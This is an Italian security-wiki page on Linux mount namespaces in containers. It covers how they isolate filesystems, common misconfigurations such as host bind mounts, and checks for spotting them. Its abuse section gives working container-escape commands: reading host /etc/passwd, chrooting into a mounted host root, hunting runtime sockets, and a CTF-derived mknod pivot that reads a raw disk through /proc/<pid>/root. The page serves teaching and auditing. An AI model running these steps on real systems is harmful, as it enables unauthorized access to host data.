# Namespace di Mount

{{#include ../../../../../banners/hacktricks-training.md}}

## Panoramica

Il namespace di mount controlla la **tabella di mount** che un processo vede. Questa è una delle funzionalità di isolamento dei container più importanti perché il filesystem di root, i bind mounts, i mount tmpfs, la vista di procfs, l'esposizione di sysfs e molte mount di supporto specifiche del runtime sono tutti espressi tramite quella tabella. Due processi possono entrambi accedere a `/`, `/proc`, `/sys` o `/tmp`, ma a cosa quei percorsi puntano dipende dal namespace di mount in cui si trovano.

Dal punto di vista della container-security, il namespace di mount è spesso la differenza tra «questo è un filesystem dell'applicazione ben preparato» e «questo processo può vedere o influenzare direttamente il filesystem host». Per questo motivo bind mounts, i volumi `hostPath`, operazioni di mount privilegiate e l'esposizione scrivibile di `/proc` o `/sys` ruotano tutti attorno a questo namespace.

## Funzionamento

Quando un runtime avvia un container, di solito crea un nuovo namespace di mount, prepara un filesystem di root per il container, monta procfs e altri filesystem di supporto secondo necessità, e poi opzionalmente aggiunge bind mounts, mount tmpfs, secrets, config maps o host paths. Una volta che quel processo è in esecuzione all'interno del namespace, l'insieme di mount che vede è sostanzialmente disaccoppiato dalla vista predefinita dell'host. L'host può ancora vedere il filesystem sottostante reale, ma il container vede la versione assemblata per lui dal runtime.

Questo è potente perché permette al container di credere di avere il proprio filesystem di root anche se l'host continua a gestire tutto. È anche pericoloso perché se il runtime espone il mount sbagliato, il processo ottiene improvvisamente visibilità sulle risorse host che il resto del modello di sicurezza potrebbe non essere stato progettato per proteggere.

## Laboratorio

Puoi creare un namespace di mount privato con:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Se apri un'altra shell al di fuori di quel namespace e ispezioni la tabella dei mount, vedrai che il tmpfs mount esiste solo all'interno del mount namespace isolato. Questo è un esercizio utile perché dimostra che l'isolamento dei mount non è teoria astratta; il kernel sta letteralmente presentando una tabella dei mount diversa al processo.
Se apri un'altra shell al di fuori di quel namespace e ispezioni la tabella dei mount, il tmpfs mount esisterà solo all'interno del mount namespace isolato.

All'interno dei container, un rapido confronto è:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Il secondo esempio dimostra quanto sia facile per una configurazione di runtime praticare un'enorme breccia nel confine del filesystem.

## Utilizzo a runtime

Docker, Podman, containerd-based stacks, and CRI-O si basano tutti su un mount namespace privato per i container normali. Kubernetes si appoggia allo stesso meccanismo per volumes, projected secrets, config maps e i mount `hostPath`. Gli ambienti Incus/LXC fanno anche molto affidamento sui mount namespaces, soprattutto perché i system containers spesso espongono filesystem più ricchi e simili a quelli di una macchina rispetto agli application containers.

Questo significa che quando esamini un problema relativo al filesystem di un container, di solito non stai guardando una stranezza isolata di Docker. Stai guardando un problema di mount-namespace e runtime-configuration espresso attraverso qualunque piattaforma abbia avviato il workload.

## Misconfigurazioni

L'errore più ovvio e pericoloso è esporre il host root filesystem o un altro percorso host sensibile tramite un bind mount, per esempio `-v /:/host` o un `hostPath` scrivibile in Kubernetes. A quel punto la domanda non è più "can the container somehow escape?" ma piuttosto "how much useful host content is already directly visible and writable?" Un host bind mount scrivibile spesso trasforma il resto dell'exploit in una semplice questione di posizionamento di file, chrooting, modifica della config o discovery di socket a runtime.

Un altro problema comune è esporre il host `/proc` o `/sys` in modi che aggirano la vista più sicura del container. Questi filesystem non sono mount di dati ordinari; sono interfacce allo stato del kernel e dei processi. Se il workload raggiunge direttamente le versioni host, molte delle assunzioni alla base dell'hardening dei container smettono di applicarsi correttamente.

Le protezioni di sola lettura contano anche. Un root filesystem di sola lettura non mette magicamente in sicurezza un container, ma rimuove una grande quantità di spazio di staging per l'attaccante e rende più difficili persistenza, posizionamento di helper-binary e manomissione della config. Al contrario, un root scrivibile o un host bind mount scrivibile danno a un attaccante spazio per preparare il prossimo passo.

## Abuso

Quando il mount namespace viene usato male, gli attaccanti comunemente fanno una di quattro cose. Essi **leggono dati host** che sarebbero dovuti rimanere fuori dal container. Essi **modificano la configurazione host** tramite bind mount scrivibili. Essi **montano o rimontano risorse aggiuntive** se capabilities e seccomp lo permettono. Oppure **raggiungono socket potenti e directory di stato a runtime** che permettono loro di chiedere alla piattaforma di container stessa più accesso.

Se il container può già vedere il filesystem host, il resto del modello di sicurezza cambia immediatamente.

Quando sospetti un host bind mount, prima conferma cosa è disponibile e se è scrivibile:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Se il filesystem root dell'host è montato in lettura-scrittura, l'accesso diretto all'host è spesso semplice come:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Se l'obiettivo è l'accesso privilegiato a runtime piuttosto che il chrooting diretto, enumera sockets e lo stato di runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Se `CAP_SYS_ADMIN` è presente, testa anche se è possibile creare nuovi mount dall'interno del container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Esempio completo: Two-Shell `mknod` Pivot

Un percorso di abuso più specializzato si verifica quando l'utente root del container può creare dispositivi a blocchi, l'host e il container condividono un'identità utente in modo utile e l'attaccante ha già un punto d'appoggio con bassi privilegi sull'host. In quella situazione, il container può creare un nodo dispositivo come `/dev/sda`, e l'utente dell'host con pochi privilegi può poi leggerlo tramite `/proc/<pid>/root/` per il processo del container corrispondente.

All'interno del container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Dall'host, come l'utente a basso privilegio corrispondente dopo aver individuato il PID della shell del container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
La lezione importante non è la ricerca esatta della stringa CTF. È che l'esposizione del mount-namespace tramite `/proc/<pid>/root/` può permettere a un utente host di riutilizzare device nodes creati dal container anche quando la cgroup device policy impediva l'uso diretto all'interno del container stesso.

## Controlli

Questi comandi servono a mostrarti la vista del filesystem in cui il processo corrente si trova realmente. L'obiettivo è individuare mount derivati dall'host, percorsi sensibili scrivibili e qualsiasi elemento che sembri più ampio rispetto al normale root filesystem di un container applicativo.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Cosa c'è di interessante qui:

- I bind mounts provenienti dall'host, specialmente `/`, `/proc`, `/sys`, le directory di stato runtime o le posizioni di socket, dovrebbero risaltare immediatamente.
- I mount read-write inaspettati sono generalmente più importanti di un gran numero di mount helper in sola lettura.
- `mountinfo` è spesso il posto migliore per vedere se un percorso è davvero derivato dall'host o supportato da overlay.

Questi controlli stabiliscono **quali risorse sono visibili in questo namespace**, **quali sono derivate dall'host**, e **quali di esse sono scrivibili o sensibili per la sicurezza**.
